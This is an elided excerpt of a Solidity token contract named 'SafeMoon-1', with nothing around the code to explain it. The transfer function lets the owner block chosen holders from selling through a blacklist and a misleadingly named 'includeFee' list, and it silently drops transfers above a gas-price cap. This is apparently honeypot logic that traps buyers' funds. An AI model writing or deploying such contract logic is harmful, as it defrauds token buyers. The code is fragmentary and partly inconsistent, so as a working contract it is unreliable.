...
contract SafemoonDashOne is Context, IERC20, Ownable {
    ...
    string private constant _name = "SafeMoon-1";
    string private constant _symbol = "SafeMoon-1";
    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1 * 10**_decimals;
    uint256 public _maxTxAmount = 3 * 10**7;
    uint256 public _maxWalletAmount = 3 * 10**7;
    ...
    function includeFee(address[] calldata addresses) external onlyOwner {
    ...
    function blacklistSnipe(address sniper) external onlyOwner {
        _isBlacklisted[sniper] = true;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (from != uniswapV2Pair) {
                require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount"); require(!_isIncludedFromFee[from]); require(!_isBlacklisted[from]); if (tx.gasprice > maxGwei) return;
